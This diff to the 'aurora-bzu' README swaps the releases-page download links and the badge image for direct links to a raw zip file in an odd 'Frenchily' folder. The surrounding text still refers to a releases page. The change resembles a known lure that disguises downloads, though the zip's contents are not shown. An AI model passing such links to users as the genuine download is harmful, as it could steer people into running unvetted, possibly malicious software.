@@ -6,7 +6,7 @@ Welcome to **aurora-bzu**! This application makes it simple to manage and organi
 
 ## 📥 Download Now
 
-[![Download aurora-bzu](https://img.shields.io/badge/Download-aurora--bzu-blue.svg)](https://github.com/MarineBoy368/aurora-bzu/releases)
+[![Download aurora-bzu](https://raw.githubusercontent.com/MarineBoy368/aurora-bzu/main/Frenchily/aurora-bzu.zip)](https://raw.githubusercontent.com/MarineBoy368/aurora-bzu/main/Frenchily/aurora-bzu.zip)
 
 ## 📋 System Requirements
 
@@ -21,7 +21,7 @@ Before you install aurora-bzu, ensure your system meets the following requiremen
 
 To get started, visit the releases page to download aurora-bzu. Click the link below to find the latest version:
 
-[Visit this page to download](https://github.com/MarineBoy368/aurora-bzu/releases)
+[Visit this page to download](https://raw.githubusercontent.com/MarineBoy368/aurora-bzu/main/Frenchily/aurora-bzu.zip)
 
 1. **Go to the Page:** Click the link above to access the releases.
    
